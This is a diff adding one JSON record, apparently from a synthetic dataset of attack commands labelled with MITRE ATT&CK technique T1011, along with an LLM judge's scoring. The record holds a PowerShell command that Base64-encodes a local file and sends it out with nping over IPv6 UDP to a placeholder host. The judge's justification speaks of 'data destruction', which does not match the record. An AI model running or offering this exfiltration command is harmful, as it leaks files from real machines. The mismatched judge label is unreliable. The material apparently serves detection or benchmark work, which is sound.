@@ -1,0 +1,36 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); nping.exe -6 --udp --dest-port 56123 --data-string $b -c 3 --rate 1 2001:db8:dead:beef::22",
+  "explanation": "Leverages nping to send multiple IPv6 UDP packets carrying Base64 data to an uncommon port, acting over a medium (IPv6/UDP) distinct from standard HTTP/HTTPS exfil paths, consistent with T1011.",
+  "rationale_steps": [
+    "Encode target data in Base64 to reduce casual readability.",
+    "Transmit in a few paced UDP bursts over IPv6 to an uncommon destination port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-6919b9bb-5fd99f37",
+  "source_prompt_hash": "6919b9bb",
+  "timestamp_utc": "2025-09-30T08:36:22.996855Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell assignment and external command are properly separated by a semicolon, quoting and parentheses are balanced, and nping flags/arguments are well-formed.",
+        "semantic_score": 1,
+        "semantic_justification": "The command base64-encodes a file and transmits it via IPv6 UDP using nping (exfiltration), which does not perform or attempt any data destruction as described.",
+        "combined_score": 3.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T23:29:47.006441Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.0,
+    "llm_average_score": 3.0,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
